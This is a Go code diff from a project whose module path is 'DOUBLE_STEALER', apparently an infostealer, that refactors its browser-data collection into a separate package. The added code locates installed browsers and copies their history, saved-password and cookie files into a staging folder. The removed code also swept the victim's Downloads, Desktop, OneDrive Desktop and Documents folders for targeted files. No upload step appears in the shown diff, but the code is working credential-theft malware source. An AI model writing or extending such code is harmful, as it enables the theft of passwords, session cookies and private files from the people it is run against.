@@ -1,8 +1,8 @@
-package getdata
+package getnav
 
 import (
+	"DOUBLE_STEALER/getdata"
 	"fmt"
-	"io"
 	"os"
 	"path/filepath"
 	"runtime"
@@ -211,96 +211,23 @@ func GetCookieFiles(browser string) ([]string, error) {
 	return filePaths, nil
 }
 
-// Copier un fichier
-func CopyFile(src, dst string) error {
-	sourceFile, err := os.Open(src)
-	if err != nil {
-		return err
-	}
-	defer sourceFile.Close()
-
-	destinationFile, err := os.Create(dst)
-	if err != nil {
-		return err
-	}
-	defer destinationFile.Close()
-
-	_, err = io.Copy(destinationFile, sourceFile)
-	if err != nil {
-		return err
-	}
-
-	return nil
-}
-
-// Obtenir les fichiers d'un répertoire selon une liste d'extensions et de noms
-func GetFiles(dir string, extensions, names []string) ([]string, error) {
-	var result []string
-
-	err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
-		if err != nil {
-			return err
-		}
-		if !info.IsDir() {
-			for _, ext := range extensions {
-				if strings.HasSuffix(info.Name(), ext) {
-					for _, name := range names {
-						if strings.Contains(info.Name(), name) {
-							result = append(result, path)
-							break
-						}
-					}
-				}
-			}
-		}
-		return nil
-	})
-
-	if err != nil {
-		return nil, fmt.Errorf("erreur lors de la recherche des fichiers : %v", err)
-	}
-
-	return result, nil
-}
-
-// Créer les dossiers de données si nécessaire
-func CreateDataFolders(dataFolder string) error {
-	folders := []string{
-		"Downloads",
-		"Desktop",
-		"Documents",
-		"Navigateurs",
-	}
-
-	for _, folder := range folders {
-		if err := os.MkdirAll(filepath.Join(dataFolder, folder), 0755); err != nil {
-			return fmt.Errorf("erreur lors de la création du dossier %s : %v", folder, err)
-		}
-	}
-	return nil
-}
-
-// Traiter les données dans le dossier DATA
-func ProcessData(dataFolder string, extensions, names []string) error {
-	if _, err := os.Stat(dataFolder); os.IsNotExist(err) {
-		err := os.Mkdir(dataFolder, 0755)
-		if err != nil {
-			return fmt.Errorf("erreur lors de la création du dossier DATA : %v", err)
-		}
-	}
-
-	browsersFolder := filepath.Join(dataFolder, "Navigateurs")
-	if _, err := os.Stat(browsersFolder); os.IsNotExist(err) {
-		err := os.Mkdir(browsersFolder, 0755)
+// ProcessNavData traite uniquement les données des navigateurs dans le dossier Navigateurs
+func ProcessNavData(navFolder string) error {
+	// Créer le dossier Navigateurs si nécessaire
+	if _, err := os.Stat(navFolder); os.IsNotExist(err) {
+		err := os.Mkdir(navFolder, 0755)
 		if err != nil {
 			return fmt.Errorf("erreur lors de la création du dossier Navigateurs : %v", err)
 		}
 	}
 
-	installedBrowsers := CheckInstalledBrowsers()
+	// Vérifier les navigateurs installés
+	installedBrowsers := CheckInstalledBrowsers() // Utilise la fonction de getdata
 
+	// Parcourir les navigateurs installés
 	for browser := range installedBrowsers {
-		browserFolder := filepath.Join(browsersFolder, browser)
+		// Créer un sous-dossier pour chaque navigateur
+		browserFolder := filepath.Join(navFolder, browser)
 		if _, err := os.Stat(browserFolder); os.IsNotExist(err) {
 			err := os.Mkdir(browserFolder, 0755)
 			if err != nil {
@@ -309,150 +236,64 @@ func ProcessData(dataFolder string, extensions, names []string) error {
 			}
 		}
 
-		// Récupérer les fichiers d'historique
+		// Récupérer et copier les fichiers d'historique
 		historyFilePaths, err := GetHistoryFilePath(browser)
 		if err != nil {
 			fmt.Printf("Erreur lors de la récupération des fichiers d'historique pour %s : %v\n", browser, err)
 			continue
 		}
-
 		for _, filePath := range historyFilePaths {
-			if _, err := os.Stat(filePath); os.IsNotExist(err) {
-				fmt.Printf("Aucun fichier trouvé à l'emplacement : %s\n", filePath)
-			} else {
-				fmt.Printf("Fichier trouvé à l'emplacement : %s\n", filePath)
-
-				destination := filepath.Join(browserFolder, filepath.Base(filePath))
-				err := CopyFile(filePath, destination)
-				if err != nil {
-					fmt.Printf("Erreur lors de la copie du fichier d'historique de %s : %v\n", browser, err)
-				} else {
-					fmt.Printf("Le fichier d'historique de %s a été copié dans %s\n", browser, destination)
-				}
+			err := copyNavFile(filePath, browserFolder, "d'historique", browser)
+			if err != nil {
+				fmt.Printf("Erreur lors de la copie du fichier d'historique : %v\n", err)
 			}
 		}
 
-		// Récupérer les fichiers de mots de passe
+		// Récupérer et copier les fichiers de mots de passe
 		passwordFiles, err := GetPasswordFiles(browser)
 		if err != nil {
 			fmt.Printf("Erreur lors de la récupération des fichiers de mots de passe pour %s : %v\n", browser, err)
 			continue
 		}
-
 		for _, filePath := range passwordFiles {
-			if _, err := os.Stat(filePath); os.IsNotExist(err) {
-				fmt.Printf("Aucun fichier trouvé à l'emplacement : %s\n", filePath)
-			} else {
-				fmt.Printf("Fichier trouvé à l'emplacement : %s\n", filePath)
-
-				destination := filepath.Join(browserFolder, filepath.Base(filePath))
-				err := CopyFile(filePath, destination)
-				if err != nil {
-					fmt.Printf("Erreur lors de la copie du fichier de mots de passe de %s : %v\n", browser, err)
-				} else {
-					fmt.Printf("Le fichier de mots de passe de %s a été copié dans %s\n", browser, destination)
-				}
+			err := copyNavFile(filePath, browserFolder, "de mots de passe", browser)
+			if err != nil {
+				fmt.Printf("Erreur lors de la copie du fichier de mots de passe : %v\n", err)
 			}
 		}
 
-		// Récupérer les fichiers de cookies
+		// Récupérer et copier les fichiers de cookies
 		cookieFiles, err := GetCookieFiles(browser)
 		if err != nil {
 			fmt.Printf("Erreur lors de la récupération des fichiers de cookies pour %s : %v\n", browser, err)
 			continue
 		}
-
 		for _, filePath := range cookieFiles {
-			if _, err := os.Stat(filePath); os.IsNotExist(err) {
-				fmt.Printf("Aucun fichier trouvé à l'emplacement : %s\n", filePath)
-			} else {
-				fmt.Printf("Fichier trouvé à l'emplacement : %s\n", filePath)
-
-				destination := filepath.Join(browserFolder, filepath.Base(filePath))
-				err := CopyFile(filePath, destination)
-				if err != nil {
-					fmt.Printf("Erreur lors de la copie du fichier de cookies de %s : %v\n", browser, err)
-				} else {
-					fmt.Printf("Le fichier de cookies de %s a été copié dans %s\n", browser, destination)
-				}
+			err := copyNavFile(filePath, browserFolder, "de cookies", browser)
+			if err != nil {
+				fmt.Printf("Erreur lors de la copie du fichier de cookies : %v\n", err)
 			}
 		}
-	}
-
-	err := CopyFilesToUserDirectories(dataFolder, extensions, names)
-	if err != nil {
-		return fmt.Errorf("erreur lors de la copie des fichiers : %v", err)
 	}
 
 	return nil
 }
 
-func CopyFilesToUserDirectories(dataFolder string, extensions, names []string) error {
-	userHome, err := os.UserHomeDir()
+// copyNavFile est une fonction utilitaire pour copier des fichiers de navigateurs
+func copyNavFile(filePath, browserFolder, fileType, browser string) error {
+	if _, err := os.Stat(filePath); os.IsNotExist(err) {
+		fmt.Printf("Aucun fichier %s trouvé pour %s à l'emplacement : %s\n", fileType, browser, filePath)
+		return nil
+	}
+
+	fmt.Printf("Fichier %s trouvé pour %s à l'emplacement : %s\n", fileType, browser, filePath)
+
+	destination := filepath.Join(browserFolder, filepath.Base(filePath))
+	err := getdata.CopyFile(filePath, destination) // Utilisation de la fonction CopyFile de getdata
 	if err != nil {
-		return fmt.Errorf("erreur lors de la récupération du répertoire personnel de l'utilisateur : %v", err)
+		return fmt.Errorf("erreur lors de la copie du fichier %s de %s : %v", fileType, browser, err)
 	}
 
-	oneDriveDesktop := filepath.Join(userHome, "OneDrive", "Desktop")
-
-	directories := []string{
-		filepath.Join(userHome, "Downloads"),
-		filepath.Join(userHome, "Desktop"),
-		oneDriveDesktop,
-		filepath.Join(userHome, "Documents"),
-	}
-
-	subFolders := []string{"Downloads", "Desktop", "Documents", "Navigateurs"}
-	for _, folder := range subFolders {
-		err := os.MkdirAll(filepath.Join(dataFolder, folder), 0755)
-		if err != nil {
-			return fmt.Errorf("erreur lors de la création du sous-dossier %s : %v", folder, err)
-		}
-	}
-
-	var wg sync.WaitGroup
-
-	for _, dir := range directories {
-		wg.Add(1)
-
-		go func(dir string) {
-			defer wg.Done()
-
-			fmt.Printf("Recherche de fichiers dans : %s\n", dir)
-
-			files, err := GetFiles(dir, extensions, names)
-			if err != nil {
-				fmt.Printf("Erreur lors de la récupération des fichiers dans %s : %v\n", dir, err)
-				return
-			}
-
-			for _, filePath := range files {
-				fileName := filepath.Base(filePath)
-				var destinationDir string
-
-				switch {
-				case strings.HasPrefix(filePath, filepath.Join(userHome, "Downloads")):
-					destinationDir = filepath.Join(dataFolder, "Downloads")
-				case strings.HasPrefix(filePath, filepath.Join(userHome, "Desktop")):
-					destinationDir = filepath.Join(dataFolder, "Desktop")
-				case strings.HasPrefix(filePath, oneDriveDesktop):
-					destinationDir = filepath.Join(dataFolder, "Desktop")
-				case strings.HasPrefix(filePath, filepath.Join(userHome, "Documents")):
-					destinationDir = filepath.Join(dataFolder, "Documents")
-				}
-
-				destination := filepath.Join(destinationDir, fileName)
-
-				err := CopyFile(filePath, destination)
-				if err != nil {
-					fmt.Printf("Erreur lors de la copie de %s : %v\n", filePath, err)
-				} else {
-					fmt.Printf("Fichier %s copié dans %s\n", fileName, destinationDir)
-				}
-			}
-		}(dir)
-	}
-
-	wg.Wait()
+	fmt.Printf("Le fichier %s de %s a été copié dans %s\n", fileType, browser, destination)
 	return nil
 }
